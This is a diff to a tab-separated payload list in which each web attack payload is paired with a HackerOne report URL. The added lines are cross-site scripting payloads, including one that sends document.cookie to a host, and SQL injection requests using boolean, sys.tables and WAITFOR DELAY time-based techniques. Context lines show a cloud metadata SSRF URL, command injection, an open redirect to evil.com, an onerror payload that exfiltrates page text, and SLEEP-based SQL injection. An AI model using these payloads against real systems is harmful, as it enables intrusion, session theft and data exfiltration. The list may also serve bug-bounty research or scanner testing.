@@ -1226,9 +1226,19 @@ http://169.254.169.254/	https://hackerone.com/reports/3608558
 system("id>/tmp/pwned")	https://hackerone.com/reports/3679660
 https://target.com/login?continue=https%3A%2F%2Fevil.com%2F	https://hackerone.com/reports/3723458
 https://target.com/transfer_auth?key=<TOKEN>&continue=/	https://hackerone.com/reports/3723458
+<img onerror>	https://hackerone.com/reports/3729501
+"<script>alert(1)</script>"@a.com	https://hackerone.com/reports/3729501
+fetch('https://target.com/?c='+document.cookie)	https://hackerone.com/reports/3729501
+app.alert(1)	https://hackerone.com/reports/3729501
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D1--	https://hackerone.com/reports/3778282
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2--	https://hackerone.com/reports/3778282
+GET /api/WDMProduct?searchText=zzz%27)%20OR%201%3D2%20OR%20(SELECT%20COUNT(*)%20FROM%20sys.tables)%3E0--	https://hackerone.com/reports/3778282
+GET /api/WDMProduct?searchText=zzz%27);WAITFOR%20DELAY%20%270:0:6%27--	https://hackerone.com/reports/3778282
+searchText=zzz') OR 1=1--	https://hackerone.com/reports/3778282
+searchText=zzz');WAITFOR DELAY '0:0:6'--	https://hackerone.com/reports/3778282
+OR 1=1	https://hackerone.com/reports/3778282
 <img src=x onerror="fetch('https://target.com/exfil',{method:'POST',body:btoa(document.body.innerText)})">	https://hackerone.com/reports/3779690
 <img src=x onerror="location='https://target.com/drive-by-download'">	https://hackerone.com/reports/3779690
-<img onerror>	https://hackerone.com/reports/3779690
 SAFE_ARG'; whoami > "$NODE_RUN_COMMAND_OUTPUT"; #	https://hackerone.com/reports/3817602
 author_exclude=1) OR SLEEP(N)-- -	https://hackerone.com/reports/3873072
 1) OR SLEEP(0)-- -	https://hackerone.com/reports/3873072
